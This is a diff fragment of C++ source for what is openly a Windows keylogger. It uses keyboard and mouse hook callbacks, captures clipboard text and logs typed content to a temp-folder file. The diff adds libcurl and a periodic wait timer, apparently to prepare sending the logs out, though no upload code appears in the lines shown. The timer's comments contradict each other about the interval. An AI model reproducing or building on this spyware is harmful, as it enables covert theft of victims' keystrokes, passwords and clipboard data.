@@ -3,6 +3,11 @@
 #include <iostream>
 #include <Windows.h>
 #include <fstream>
+#include <string>
+#include <thread>
+#include <chrono>
+
+#include "include/curl/curl.h"
 
 #pragma comment(lib, "user32.lib") // user32.dll windows' library
 
@@ -61,6 +66,8 @@ const std::string FilePath = (std::string)tempFolderPath + "logs.txt"; // settin
 std::string clipBoardLastSave = ""; // saving the text in the windows' clipBoard
 std::string contentFile = ""; // save everything of what is been writing down
 
+const std::chrono::seconds waitTime = std::chrono::seconds(int(/* => minutes */ 90)); // seconds -> 15 minutes
+
 class WindowsHook
 {
 private:
@@ -70,9 +77,12 @@ public:
 	WindowsHook();
 	~WindowsHook();
 
-	bool SetHook(std::string type);
+	bool SetHook(int type);
 	bool UnHook();
-	static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
-	static LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam);
 };
+
+LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
+LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam);
+
+std::string StartString();
 
